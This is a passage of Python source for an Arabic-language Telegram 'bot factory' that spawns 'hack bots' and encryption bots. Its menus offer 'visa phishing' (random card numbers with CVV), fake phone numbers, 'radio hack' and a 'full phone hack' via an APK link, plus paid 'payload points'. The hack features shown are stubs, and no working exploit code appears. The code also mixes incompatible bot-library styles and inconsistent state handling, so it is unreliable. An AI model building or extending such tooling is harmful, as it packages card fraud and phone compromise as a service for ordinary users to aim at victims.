        elif data == "user_button_smart_game":
            send_message(context.bot, chat_id, "🧠 اللعبة قيد التطوير.")
            return
        elif data == "user_button_fake_numbers":
            fake = generate_fake_number_details()
            msg = f"📞 الرقم: {fake['phone_number']}\n🌍 الدولة: {fake['country']}\n📱 المنصة: {fake['platform']}\n📅 تاريخ الإنشاء: {fake['creation_date']}"
            send_message(context.bot, chat_id, msg,
                         reply_markup=get_fake_number_keyboard(current_bot_username, user_id))
            return
        elif data == "user_button_visa_phishing":
            visa = generate_random_visa_details()
            msg = f"💳 رقم البطاقة: {visa['card_number']}\n📅 الانتهاء: {visa['expiry']}\n🔐 CVV: {visa['cvv']}\n🏦 البنك: {visa['bank']}\n📋 النوع: {visa['card_type']}\n🌍 الدولة: {visa['country']}\n💰 القيمة: {visa['value']}"
            send_message(context.bot, chat_id, msg)
            return
        elif data == "user_button_radio_hack":
            msg = "📻 محطات الراديو:\n\n"
            for station in SUDAN_RADIO_STATIONS + EGYPT_RADIO_STATIONS[:5]:
                msg += f"🎵 {station['name']}: {station['url']}\n"
            send_message(context.bot, chat_id, msg)
            return
        elif data == "user_button_link_check":
            bot_user_states[current_bot_username][user_id] = {"action": "await_url_to_check"}
            send_message(context.bot, chat_id, "📝 أرسل الرابط لفحصه:")
            return
        elif data == "user_button_name_decorate":
            keyboard = [
                [InlineKeyboardButton("🇬🇧 اسم إنجليزي", callback_data="decorate_english")],
                [InlineKeyboardButton("🇸🇦 اسم عربي", callback_data="decorate_arabic")],
                [InlineKeyboardButton("رجوع", callback_data="back_to_main_user_menu")]
            ]
            send_message(context.bot, chat_id, "اختر نوع الاسم:", reply_markup=InlineKeyboardMarkup(keyboard))
            return
        elif data == "decorate_english":
            bot_user_states[current_bot_username][user_id] = {"action": "await_name_to_decorate", "name_type": "english"}
            send_message(context.bot, chat_id, "📝 أرسل الاسم بالإنجليزية:")
            return
        elif data == "decorate_arabic":
            bot_user_states[current_bot_username][user_id] = {"action": "await_name_to_decorate", "name_type": "arabic"}
            send_message(context.bot, chat_id, "📝 أرسل الاسم بالعربية:")
            return
        elif data == "telegram_usernames_menu":
            keyboard = [
                [InlineKeyboardButton("يوزر نوع واحد", callback_data="get_username_single_type")],
                [InlineKeyboardButton("يوزرات رباعية", callback_data="get_username_quad_usernames")],
                [InlineKeyboardButton("شبه رباعي", callback_data="get_username_semi_quad")],
                [InlineKeyboardButton("شبه ثلاثية", callback_data="get_username_semi_triple")],
                [InlineKeyboardButton("عشوائي", callback_data="get_username_random")],
                [InlineKeyboardButton("فريد", callback_data="get_username_unique")],
                [InlineKeyboardButton("رجوع", callback_data="back_to_main_user_menu")]
            ]
            edit_message_text(context.bot, chat_id, message_id, "اختر نوع اليوزر:", reply_markup=InlineKeyboardMarkup(keyboard))
            return
        elif data.startswith("get_username_"):
            username_type = data.replace("get_username_", "")
            query.answer("جاري البحث...", show_alert=True)
            found = []
            for i in range(5):
                username = generate_and_check_username(current_bot_token, username_type)
                if username:
                    found.append(username)
                else:
                    break
            if found:
                msg = "✅ تم العثور على:\n\n" + "\n".join(f"✨ @{u}" for u in found)
                send_message(context.bot, chat_id, msg)
            else:
                send_message(context.bot, chat_id, "لم يتم العثور على يوزرات متاحة.")
            return
        elif data.startswith("full_phone_hack_"):
            send_message(context.bot, chat_id, "⏳ جاري المعالجة...\nهذه الميزة تعمل على الهاتف المستهدف عبر رابط APK.")
            return

    # أزرار الأدمن في البوتات المصنوعة
    if user_id == admin_id:
        if data == "m1":
            members_count = len(bot_settings.get("members", []))
            send_message(context.bot, chat_id, f"👥 عدد المشتركون: {members_count}")
            return
        elif data == "send":
            bot_user_states[current_bot_username][user_id] = {"action": "await_broadcast_message"}
            send_message(context.bot, chat_id, "📝 أرسل الرسالة للإذاعة:")
            return
        elif data == "forward":
            send_message(context.bot, chat_id, "📝 أرسل الرسالة الموجهة:")
            return
        elif data == "ach":
            bot_user_states[current_bot_username][user_id] = {"action": "await_channel_for_subscription"}
            send_message(context.bot, chat_id, "📝 أرسل معرف القناة:")
            return
        elif data == "dch":
            if bot_settings["channels"]:
                keyboard = []
                for ch in bot_settings["channels"]:
                    keyboard.append([InlineKeyboardButton(f"🗑 {ch}", callback_data=f"remove_ch_{ch}")])
                keyboard.append([InlineKeyboardButton("رجوع", callback_data="back_to_admin")])
                send_message(context.bot, chat_id, "اختر القناة للحذف:", reply_markup=InlineKeyboardMarkup(keyboard))
            else:
                send_message(context.bot, chat_id, "لا توجد قنوات إجبارية.")
            return
        elif data.startswith("remove_ch_"):
            ch_to_remove = data.replace("remove_ch_", "")
            if ch_to_remove in bot_settings["channels"]:
                bot_settings["channels"].remove(ch_to_remove)
                save_made_bot_settings(current_bot_username)
                send_message(context.bot, chat_id, f"✅ تم حذف {ch_to_remove}")
            return
        elif data == "back_to_admin":
            send_message(context.bot, chat_id, "لوحة التحكم:", reply_markup=get_admin_keyboard(current_bot_username, user_id, bot_type))
            return
        elif data == "ons":
            bot_settings["notifications"] = "on"
            save_made_bot_settings(current_bot_username)
            send_message(context.bot, chat_id, "✅ تم تفعيل التنبيهات.")
            return
        elif data == "ofs":
            bot_settings["notifications"] = "off"
            save_made_bot_settings(current_bot_username)
            send_message(context.bot, chat_id, "✅ تم تعطيل التنبيهات.")
            return
        elif data == "obot":
            bot_settings["bot_status"] = "on"
            save_made_bot_settings(current_bot_username)
            send_message(context.bot, chat_id, "✅ تم فتح البوت.")
            return
        elif data == "ofbot":
            bot_settings["bot_status"] = "off"
            save_made_bot_settings(current_bot_username)
            send_message(context.bot, chat_id, "✅ تم إيقاف البوت.")
            return
        elif data == "pro":
            bot_settings["payment_status"] = "on"
            save_made_bot_settings(current_bot_username)
            send_message(context.bot, chat_id, "✅ تم تفعيل الوضع المدفوع.")
            return
        elif data == "frre":
            bot_settings["payment_status"] = "free"
            save_made_bot_settings(current_bot_username)
            send_message(context.bot, chat_id, "✅ تم تفعيل الوضع المجاني.")
            return
        elif data == "pro123":
            bot_user_states[current_bot_username][user_id] = {"action": "await_paid_user_id"}
            send_message(context.bot, chat_id, "📝 أرسل معرف المستخدم:")
            return
        elif data == "frre123":
            bot_user_states[current_bot_username][user_id] = {"action": "await_remove_paid_user_id"}
            send_message(context.bot, chat_id, "📝 أرسل معرف المستخدم:")
            return
        elif data == "ban":
            bot_user_states[current_bot_username][user_id] = {"action": "await_ban_user_id"}
            send_message(context.bot, chat_id, "📝 أرسل معرف المستخدم للحظر:")
            return
        elif data == "unban":
            bot_user_states[current_bot_username][user_id] = {"action": "await_unban_user_id"}
            send_message(context.bot, chat_id, "📝 أرسل معرف المستخدم لإلغاء الحظر:")
            return
        elif data == "set_start_message":
            bot_user_states[current_bot_username][user_id] = {"action": "await_new_start_message"}
            send_message(context.bot, chat_id, "📝 أرسل رسالة البدء الجديدة:")
            return
        elif data == "download_bot_data":
            settings_file = get_made_bot_data_path(current_bot_username)
            if os.path.exists(settings_file):
                with open(settings_file, 'rb') as f:
                    context.bot.send_document(chat_id=chat_id, document=f, filename=f"{current_bot_username}_settings.json")
            return
        elif data == "set_payload_points":
            bot_user_states[current_bot_username][user_id] = {"action": "await_payload_points"}
            send_message(context.bot, chat_id, "📝 أرسل عدد النقاط المطلوبة:")
            return
        elif data == "set_main_channel_link":
            bot_user_states[current_bot_username][user_id] = {"action": "await_channel_name_for_link"}
            send_message(context.bot, chat_id, "📝 أرسل رابط القناة الأساسية:")
            return
        elif data == "buttons_panel":
            keyboard = [
                [InlineKeyboardButton("➕ إضافة زر", callback_data="add_custom_button")],
                [InlineKeyboardButton("🗑 حذف زر", callback_data="remove_custom_button")],
                [InlineKeyboardButton("✅ تفعيل الأزرار", callback_data="enable_custom_buttons")],
                [InlineKeyboardButton("❌ تعطيل الأزرار", callback_data="disable_custom_buttons")],
                [InlineKeyboardButton("رجوع", callback_data="back_to_admin")]
            ]
            send_message(context.bot, chat_id, "إدارة الأزرار:", reply_markup=InlineKeyboardMarkup(keyboard))
            return
        elif data == "add_custom_button":
            bot_user_states[current_bot_username][user_id] = {"action": "await_custom_button_name"}
            send_message(context.bot, chat_id, "📝 أرسل اسم الزر:")
            return
        elif data == "enable_custom_buttons":
            bot_settings["custom_buttons_enabled_by_admin"] = True
            save_made_bot_settings(current_bot_username)
            send_message(context.bot, chat_id, "✅ تم تفعيل الأزرار المخصصة.")
            return
        elif data == "disable_custom_buttons":
            bot_settings["custom_buttons_enabled_by_admin"] = False
            save_made_bot_settings(current_bot_username)
            send_message(context.bot, chat_id, "✅ تم تعطيل الأزرار المخصصة.")
            return
        elif data == "remove_custom_button":
            if bot_settings["custom_buttons"]:
                keyboard = []
                for i, btn in enumerate(bot_settings["custom_buttons"]):
                    keyboard.append([InlineKeyboardButton(f"🗑 {btn['name']}", callback_data=f"del_custom_btn_{i}")])
                keyboard.append([InlineKeyboardButton("رجوع", callback_data="back_to_admin")])
                send_message(context.bot, chat_id, "اختر الزر للحذف:", reply_markup=InlineKeyboardMarkup(keyboard))
            else:
                send_message(context.bot, chat_id, "لا توجد أزرار مخصصة.")
            return
        elif data.startswith("del_custom_btn_"):
            idx = int(data.replace("del_custom_btn_", ""))
            if 0 <= idx < len(bot_settings["custom_buttons"]):
                removed = bot_settings["custom_buttons"].pop(idx)
                save_made_bot_settings(current_bot_username)
                send_message(context.bot, chat_id, f"✅ تم حذف الزر '{removed['name']}'.")
            return

    # أزرار التشفير
    if bot_type == "encryption_bot":
        if data == "encrypt_file":
            edit_message_text(context.bot, chat_id, message_id, "اختر نوع التشفير:", reply_markup=get_encryption_types_keyboard())
            bot_user_states[current_bot_username][user_id] = "await_encryption_type"
            return
        elif data == "decrypt_file":
            edit_message_text(context.bot, chat_id, message_id, "اختر نوع فك التشفير:", reply_markup=get_encryption_types_keyboard())
            bot_user_states[current_bot_username][user_id] = "await_decryption_type"
            return
        elif data.startswith("enc_type_"):
            enc_type = data.replace("enc_type_", "")
            current_state = bot_user_states[current_bot_username].get(user_id)
            if current_state == "await_encryption_type":
                send_message(context.bot, chat_id, f"📤 أرسل الملف لتشفيره بـ {enc_type}:")
                bot_user_states[current_bot_username][user_id] = {"action": "await_file_for_encryption", "type": enc_type}
            elif current_state == "await_decryption_type":
                send_message(context.bot, chat_id, f"📤 أرسل الملف لفك تشفيره بـ {enc_type}:")
                bot_user_states[current_bot_username][user_id] = {"action": "await_file_for_decryption", "type": enc_type}
            return
        elif data == "show_terms_encryption_bot":
            terms = (
                "📜 *الشروط والمتطلبات:*\n\n"
                "1. البوت مصمم لأغراض تعليمية.\n"
                "2. SHA256 لا يمكن فك تشفيره.\n"
                "3. يجب استخدام نفس نوع التشفير لفكه.\n"
                "4. يدعم الملفات النصية فقط.\n"
                "5. للدعم تواصل مع المطور."
            )
            edit_message_text(context.bot, chat_id, message_id, terms, parse_mode=ParseMode.MARKDOWN,
                              reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("رجوع", callback_data="back_to_main_encryption_menu")]]))
            return
        elif data == "back_to_main_encryption_menu":
            bot_user_states[current_bot_username][user_id] = None
            user_name = update.effective_user.first_name
            send_message(context.bot, chat_id, f"مرحباً {user_name}!\nمرحبا بك في عالم فك/التشفير",
                         reply_markup=get_user_keyboard(admin_id, current_bot_username, user_id, bot_type))
            return

    # أزرار المصنع الفرعي
    if bot_type == "factory_bot":
        if data == "create_bot_from_factory":
            keyboard = [
                [InlineKeyboardButton("💻 بوت اختراق", callback_data="create_hack_bot_sub")],
                [InlineKeyboardButton("🔐 بوت تشفير", callback_data="create_encryption_bot_sub")]
            ]
            edit_message_text(context.bot, chat_id, message_id, "اختر نوع البوت:", reply_markup=InlineKeyboardMarkup(keyboard))
            return
        elif data == "create_hack_bot_sub":
            edit_message_text(context.bot, chat_id, message_id, "📝 أرسل توكن البوت:")
            bot_user_states[current_bot_username][user_id] = {"action": "await_token_sub_bot", "bot_type": "hack_bot"}
            return
        elif data == "create_encryption_bot_sub":
            edit_message_text(context.bot, chat_id, message_id, "📝 أرسل توكن البوت:")
            bot_user_states[current_bot_username][user_id] = {"action": "await_token_sub_bot", "bot_type": "encryption_bot"}
            return


# =============================================
# handle_message_made_bot
# =============================================

def handle_message_made_bot(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    text = update.message.text.strip()
    current_bot_token = context.bot.token
    current_bot_username = get_bot_username_from_token(current_bot_token)
    if not current_bot_username:
        return

    admin_id = get_bot_admin_id(current_bot_username)
    bot_type = get_bot_type(current_bot_username)
    load_made_bot_settings(current_bot_username)
    bot_settings = made_bot_data[current_bot_username]

    if current_bot_username not in bot_user_states:
        bot_user_states[current_bot_username] = {}
    if user_id not in bot_user_states[current_bot_username]:
        bot_user_states[current_bot_username][user_id] = None

    state = bot_user_states[current_bot_username].get(user_id)

    if isinstance(state, dict) and state.get("action") == "await_image_prompt":
        send_message(context.bot, chat_id, "⏳ جاري إنشاء الصورة...")
        image_url = generate_image_via_api(text, current_bot_username, user_id)
        if image_url:
            send_message(context.bot, chat_id, image_url)
        else:
            send_message(context.bot, chat_id, "❌ فشل إنشاء الصورة.")
        bot_user_states[current_bot_username][user_id] = None
        return

    if isinstance(state, dict) and state.get("action") == "await_tts_text":
        send_message(context.bot, chat_id, "⏳ جاري التحويل...")
        audio_url = convert_text_to_speech_via_api(text, current_bot_username, user_id)
        if audio_url:
            send_message(context.bot, chat_id, audio_url)
        else:
            send_message(context.bot, chat_id, "❌ فشل التحويل.")
        bot_user_states[current_bot_username][user_id] = None
        return

    if isinstance(state, dict) and state.get("action") == "await_ai_prompt":
        send_message(context.bot, chat_id, "⏳ جاري المعالجة...")
        response = interact_with_ai_api(text, "ai", current_bot_username, user_id)
        send_message(context.bot, chat_id, response or "❌ فشل المعالجة.")
        bot_user_states[current_bot_username][user_id] = None
        return

    if isinstance(state, dict) and state.get("action") == "await_dream_text":
        send_message(context.bot, chat_id, "⏳ جاري التفسير...")
        response = interact_with_ai_api(text, "dream_interpret", current_bot_username, user_id)
        send_message(context.bot, chat_id, response or "❌ فشل التفسير.")
        bot_user_states[current_bot_username][user_id] = None
        return

    if isinstance(state, dict) and state.get("action") == "await_genie_question":
        send_message(context.bot, chat_id, "⏳ المارد يفكر...")
        response = interact_with_ai_api(text, "blue_genie_game", current_bot_username, user_id)
        send_message(context.bot, chat_id, response or "❌ فشل المارد.")
        bot_user_states[current_bot_username][user_id] = None
        return

    if isinstance(state, dict) and state.get("action") == "await_name_to_decorate":
        name_type = state.get("name_type", "english")
        if name_type == "english":
            decorated = decorate_english_name(text)
        else:
            decorated = decorate_arabic_name(text)
        send_message(context.bot, chat_id, decorated)
        bot_user_states[current_bot_username][user_id] = None
        return

    if isinstance(state, dict) and state.get("action") == "await_url_to_check":
        check_url_virustotal(update, context, text, current_bot_username, user_id)
        bot_user_states[current_bot_username][user_id] = None
        return

    # أزرار الأدمن
    if user_id == admin_id:
        if isinstance(state, dict) and state.get("action") == "await_broadcast_message":
            sent_count = 0
            for member_id in bot_settings.get("members", []):
                try:
                    send_message(context.bot, member_id, text)
                    sent_count += 1
                except:
                    pass
            send_message(context.bot, chat_id, f"✅ تم الإذاعة إلى {sent_count} عضو.")
            bot_user_states[current_bot_username][user_id] = None
            return

        if isinstance(state, dict) and state.get("action") == "await_new_start_message":
            bot_settings["start_message"] = text
            save_made_bot_settings(current_bot_username)
            send_message(context.bot, chat_id, "✅ تم تحديث رسالة البدء.")
            bot_user_states[current_bot_username][user_id] = None
            return

        if isinstance(state, dict) and state.get("action") == "await_channel_for_subscription":
            channel = text if text.startswith("@") else f"@{text}"
            if channel not in bot_settings["channels"]:
                bot_settings["channels"].append(channel)
                save_made_bot_settings(current_bot_username)
                send_message(context.bot, chat_id, f"✅ تم إضافة {channel}.")
            else:
                send_message(context.bot, chat_id, "ℹ️ مضافة بالفعل.")
            bot_user_states[current_bot_username][user_id] = None
            return

        if isinstance(state, dict) and state.get("action") == "await_ban_user_id":
            try:
                ban_id = int(text)
                if ban_id not in bot_settings["banned_users"]:
                    bot_settings["banned_users"].append(ban_id)
                    save_made_bot_settings(current_bot_username)
                    send_message(context.bot, chat_id, f"✅ تم حظر {ban_id}.")
                else:
                    send_message(context.bot, chat_id, "ℹ️ محظور بالفعل.")
            except ValueError:
                send_message(context.bot, chat_id, "❌ أرسل معرف صحيح.")
            bot_user_states[current_bot_username][user_id] = None
            return

        if isinstance(state, dict) and state.get("action") == "await_unban_user_id":
            try:
                unban_id = int(text)
                if unban_id in bot_settings["banned_users"]:
                    bot_settings["banned_users"].remove(unban_id)
                    save_made_bot_settings(current_bot_username)
                    send_message(context.bot, chat_id, f"✅ تم إلغاء حظر {unban_id}.")
                else:
                    send_message(context.bot, chat_id, "ℹ️ غير محظور.")
            except ValueError:
                send_message(context.bot, chat_id, "❌ أرسل معرف صحيح.")
            bot_user_states[current_bot_username][user_id] = None
            return

        if isinstance(state, dict) and state.get("action") == "await_paid_user_id":
            try:
                paid_id = int(text)
                if paid_id not in bot_settings["paid_users"]:
                    bot_settings["paid_users"].append(paid_id)
                    save_made_bot_settings(current_bot_username)
                    send_message(context.bot, chat_id, f"✅ تم إضافة {paid_id} كمدفوع.")
                else:
                    send_message(context.bot, chat_id, "ℹ️ مدفوع بالفعل.")
            except ValueError:
                send_message(context.bot, chat_id, "❌ أرسل معرف صحيح.")
            bot_user_states[current_bot_username][user_id] = None
            return

        if isinstance(state, dict) and state.get("action") == "await_remove_paid_user_id":
            try:
                remove_id = int(text)
                if remove_id in bot_settings["paid_users"]:
                    bot_settings["paid_users"].remove(remove_id)
                    save_made_bot_settings(current_bot_username)
                    send_message(context.bot, chat_id, f"✅ تم إزالة {remove_id}.")
                else:
                    send_message(context.bot, chat_id, "ℹ️ ليس مدفوعاً.")
            except ValueError:
                send_message(context.bot, chat_id, "❌ أرسل معرف صحيح.")
            bot_user_states[current_bot_username][user_id] = None
            return

        if isinstance(state, dict) and state.get("action") == "await_payload_points":
            try:
                points = int(text)
                bot_settings["payload_points_required"] = points
                save_made_bot_settings(current_bot_username)
                send_message(context.bot, chat_id, f"✅ تم تعيين النقاط إلى {points}.")
            except ValueError:
                send_message(context.bot, chat_id, "❌ أرسل رقم صحيح.")
            bot_user_states[current_bot_username][user_id] = None
            return

        if isinstance(state, dict) and state.get("action") == "await_channel_name_for_link":
            bot_settings["main_channel_link"] = text
            save_made_bot_settings(current_bot_username)
            send_message(context.bot, chat_id, "✅ تم تعيين القناة الأساسية.")
            bot_user_states[current_bot_username][user_id] = None
            return

        if isinstance(state, dict) and state.get("action") == "await_custom_button_name":
            bot_user_states[current_bot_username][user_id] = {"action": "await_custom_button_value", "button_name": text}
            send_message(context.bot, chat_id, "📝 أرسل رابط الزر أو نص الرسالة:")
            return

        if isinstance(state, dict) and state.get("action") == "await_custom_button_value":
            button_name = state.get("button_name")
            new_button = {"name": button_name, "type": "internal_link", "value": text}
            bot_settings["custom_buttons"].append(new_button)
            save_made_bot_settings(current_bot_username)
            send_message(context.bot, chat_id, f"✅ تم إضافة الزر '{button_name}'.")
            bot_user_states[current_bot_username][user_id] = None
            return

        if isinstance(state, dict) and state.get("action") == "await_token_sub_bot":
            send_message(context.bot, chat_id, "⏳ جاري إعداد البوت الفرعي...")
            sub_bot_token = text
            sub_bot_type = state["bot_type"]
            try:
                bot_info_resp = requests.get(f"https://api.telegram.org/bot{sub_bot_token}/getMe").json()
                if not bot_info_resp.get("ok"):
                    send_message(context.bot, chat_id, "❌ التوكن غير صالح.")
                    bot_user_states[current_bot_username][user_id] = None
                    return
                sub_bot_username = bot_info_resp["result"]["username"]
                bots = created_bots.get(user_id, [])
                bots.append({"token": sub_bot_token, "admin_id": user_id, "username": sub_bot_username, "bot_type": sub_bot_type})
                created_bots[user_id] = bots
                bot_data_file = os.path.join(DATABASE_DIR, f"{sub_bot_username}.json")
                with open(bot_data_file, 'w') as f:
                    json.dump({"token": sub_bot_token, "admin_id": user_id, "bot_type": sub_bot_type}, f)
                send_message(context.bot, chat_id, f"✅ تم تشغيل @{sub_bot_username}!")
                threading.Thread(target=run_made_bot, args=(sub_bot_token, user_id, sub_bot_username, sub_bot_type), daemon=True).start()
            except Exception as e:
                logging.error(f"Error setting up sub bot: {e}")
                send_message(context.bot, chat_id, "❌ حدث خطأ.")
            bot_user_states[current_bot_username][user_id] = None
            return


# =============================================
# handle_document_made_bot
# =============================================

def handle_document_made_bot(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    current_bot_token = context.bot.token
    current_bot_username = get_bot_username_from_token(current_bot_token)
    if not current_bot_username:
        return

    bot_type = get_bot_type(current_bot_username)
    if bot_type != "encryption_bot":
        return

    if current_bot_username not in bot_user_states:
        bot_user_states[current_bot_username] = {}
    if user_id not in bot_user_states[current_bot_username]:
        bot_user_states[current_bot_username][user_id] = None

    state = bot_user_states[current_bot_username].get(user_id)
    if not isinstance(state, dict):
        return

    enc_type = state.get("type")
    action = state.get("action")

    if action in ["await_file_for_encryption", "await_file_for_decryption"]:
        try:
            file = update.message.document.get_file()
            file_bytes = file.download_as_bytearray()
            if action == "await_file_for_encryption":
                result = encrypt_data(file_bytes, enc_type)
            else:
                result = decrypt_data(file_bytes, enc_type)
            result_path = os.path.join(DATABASE_DIR, f"result_{user_id}.txt")
            with open(result_path, 'wb') as f:
                f.write(result)
            with open(result_path, 'rb') as f:
                context.bot.send_document(chat_id=chat_id, document=f)
            os.remove(result_path)
            send_message(context.bot, chat_id, "✅ تمت العملية بنجاح!")
        except Exception as e:
            logging.error(f"Error processing document: {e}")
            send_message(context.bot, chat_id, "❌ حدث خطأ أثناء معالجة الملف.")
        bot_user_states[current_bot_username][user_id] = None


# =============================================
# نقطة التشغيل الرئيسية
# =============================================

def main():
    app = ApplicationBuilder().token(MAIN_BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start_main_bot))
    app.add_handler(CallbackQueryHandler(create_bot_main_bot, pattern="^create_bot$"))
    app.add_handler(CallbackQueryHandler(manage_bots_main_bot, pattern="^manage_bots$"))
    app.add_handler(CallbackQueryHandler(create_hack_bot_main_bot, pattern="^create_hack_bot$"))
    app.add_handler(CallbackQueryHandler(create_encryption_bot_main_bot, pattern="^create_encryption_bot$"))
    app.add_handler(CallbackQueryHandler(create_factory_bot_main_bot, pattern="^create_factory_bot$"))
    app.add_handler(CallbackQueryHandler(bot_info_main_bot, pattern="^info_"))
    app.add_handler(CallbackQueryHandler(delete_bot_main_bot, pattern="^delete_"))
    app.add_handler(CallbackQueryHandler(add_factory_admin_main_bot, pattern="^add_factory_admin$"))
    app.add_handler(CallbackQueryHandler(remove_factory_admin_main_bot, pattern="^remove_factory_admin$"))
    app.add_handler(CallbackQueryHandler(factory_stats_main_bot, pattern="^factory_stats$"))
    app.add_handler(CallbackQueryHandler(stop_all_bots_main_bot, pattern="^stop_all_bots$"))
    app.add_handler(CallbackQueryHandler(start_all_bots_main_bot, pattern="^start_all_bots$"))
    app.add_handler(CallbackQueryHandler(broadcast_free_bots_main_bot, pattern="^broadcast_free_bots$"))
    app.add_handler(CallbackQueryHandler(add_factory_main_subscription, pattern="^add_factory_main_subscription$"))
    app.add_handler(CallbackQueryHandler(remove_factory_main_subscription, pattern="^remove_factory_main_subscription$"))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message_main_bot))

    # تشغيل البوتات المصنوعة المحفوظة
    if os.path.exists(DATABASE_DIR):
        for filename in os.listdir(DATABASE_DIR):
            if filename.endswith(".json") and not filename.endswith("_settings.json"):
                bot_username = filename.replace(".json", "")
                bot_data_file = os.path.join(DATABASE_DIR, filename)
                try:
                    with open(bot_data_file, 'r') as f:
                        data = json.load(f)
                    bot_token = data.get("token")
                    bot_admin_id = data.get("admin_id")
                    bot_type_val = data.get("bot_type", "hack_bot")
                    if bot_token:
                        threading.Thread(
                            target=run_made_bot,
                            args=(bot_token, bot_admin_id, bot_username, bot_type_val),
                            daemon=True
                        ).start()
                        logging.info(f"Started bot @{bot_username}")
                except Exception as e:
                    logging.error(f"Error loading bot {bot_username}: {e}")

    logging.info("Main bot starting...")
    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
